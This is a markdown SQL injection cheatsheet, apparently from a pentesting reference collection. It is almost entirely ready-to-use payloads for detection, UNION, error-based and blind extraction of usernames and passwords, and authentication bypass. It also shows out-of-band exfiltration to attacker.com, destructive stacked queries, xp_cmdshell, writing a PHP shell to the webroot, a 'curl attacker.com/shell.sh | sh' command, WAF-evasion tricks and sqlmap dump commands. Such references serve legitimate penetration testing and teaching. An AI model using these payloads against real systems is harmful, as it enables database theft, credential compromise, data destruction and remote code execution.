---
name: SQL Injection
category: Cheatsheets & Playbooks
description: SQL injection techniques, payloads, database fingerprinting and WAF bypass reference.
tags: [sqli, sql-injection, union, blind, error-based, waf, bypass, web]
---

# SQL Injection

Reference for manual SQL injection — detection, UNION extraction, blind techniques, per-DBMS payloads and common WAF bypasses. For automated exploitation, see [sqlmap](#/tool/sqlmap).

## Detection (is it injectable?)

```
' OR '1'='1                          -- classic tautology
' OR '1'='1'--                       -- comment rest of query
" OR "1"="1"--                       -- double-quote variant
' OR 1=1#                            -- MySQL comment
1' ORDER BY 1--                      -- no error = injectable
1' AND 1=1--                         -- true  → normal response
1' AND 1=2--                         -- false → different response (boolean-based)
1' AND SLEEP(5)--                    -- delay confirms blind injection
1'; WAITFOR DELAY '0:0:5'--          -- MSSQL time-based
```

## Fingerprint the DBMS

| DBMS | Version query | String concat | Comment |
|------|--------------|---------------|---------|
| MySQL | `@@version` / `VERSION()` | `CONCAT('a','b')` | `-- ` / `#` |
| PostgreSQL | `version()` | `'a'\|\|'b'` | `--` |
| MSSQL | `@@version` | `'a'+'b'` | `--` |
| Oracle | `SELECT banner FROM v$version` | `'a'\|\|'b'` | `--` |
| SQLite | `sqlite_version()` | `'a'\|\|'b'` | `--` |

```
' UNION SELECT @@version--          -- MySQL / MSSQL
' UNION SELECT version()--          -- PostgreSQL
```

## UNION-based extraction

### Step 1 — Find the number of columns

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--                      -- increment until error
```

Or with NULL:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--     -- increment until no error
```

### Step 2 — Find a visible column

```
' UNION SELECT 'a',NULL,NULL--      -- test each position
' UNION SELECT NULL,'a',NULL--
```

### Step 3 — Extract data

#### MySQL

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
' UNION SELECT CONCAT(username,':',password),NULL FROM users--
```

#### PostgreSQL

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username||':'||password,NULL FROM users--
```

#### MSSQL

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username+':'+password,NULL FROM users--
```

#### Oracle

```sql
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT username||':'||password,NULL FROM users--
```

> Oracle requires `FROM dual` for trivial selects: `' UNION SELECT NULL,NULL FROM dual--`

## Error-based extraction

Force the DBMS to leak data inside error messages.

#### MySQL

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--
```

#### MSSQL

```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

## Blind SQLi — Boolean-based

Extract data one character at a time by observing true/false responses.

```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
' AND (SELECT COUNT(*) FROM users)>0--
```

## Blind SQLi — Time-based

No visible difference in the response — infer data from delays.

#### MySQL

```sql
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96, SLEEP(5), 0)--
```

#### PostgreSQL

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

#### MSSQL

```sql
'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--
```

## Out-of-Band (OOB) extraction

When the response gives you nothing — exfil via DNS or HTTP.

#### MySQL

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--
```

#### MSSQL

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
```

## Stacked queries

Some DBMS + drivers allow multiple statements:

```sql
'; DROP TABLE users--                -- destructive (don't do this)
'; INSERT INTO users VALUES('hacker','hacked')--
'; EXEC xp_cmdshell('whoami')--     -- MSSQL RCE if enabled
```

## Authentication bypass

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
') OR ('1'='1
' OR '1'='1' /*
```

## Reading / writing files

#### MySQL

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3c3f706870--
```

#### PostgreSQL

```sql
'; COPY (SELECT '') TO PROGRAM 'curl attacker.com/shell.sh | sh'--
```

## WAF bypass techniques

### Whitespace alternatives

```sql
'/**/UNION/**/SELECT/**/NULL--       -- inline comment as space
' UNION%09SELECT%09NULL--            -- tab (%09)
' UNION%0ASELECT%0ANULL--            -- newline (%0A)
'(UNION)(SELECT)(NULL)--             -- parentheses
```

### Case and keyword tricks

```sql
' uNiOn SeLeCt NULL--                -- mixed case
' UN/**/ION SE/**/LECT NULL--        -- split keywords
' /*!50000UNION*/ /*!50000SELECT*/ NULL--  -- MySQL version comment
```

### Encoding

```sql
' UNION SELECT NULL--                -- URL-encode the whole payload
%27%20UNION%20SELECT%20NULL--
' UNION SELECT CHAR(97)--           -- avoid quotes with CHAR()
' UNION SELECT 0x61646d696e--       -- hex-encoded string
```

### Function substitutions (bypass signatures)

| Blocked | Alternative |
|---------|------------|
| `SUBSTRING()` | `MID()`, `SUBSTR()`, `LEFT()` |
| `ASCII()` | `HEX()`, `BIN()`, `ORD()` |
| `BENCHMARK()` | `SLEEP()` |
| `CONCAT()` | `CONCAT_WS()`, `GROUP_CONCAT()` |
| `=` | `LIKE`, `REGEXP`, `BETWEEN`, `IN()` |
| spaces | `/**/`, `%09`, `%0a`, `()` |

## Quick automation with sqlmap

```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --batch --level 5 --risk 3   # from Burp saved request
```

See the full [sqlmap](#/tool/sqlmap) cheatsheet for flags, tamper scripts and advanced usage.
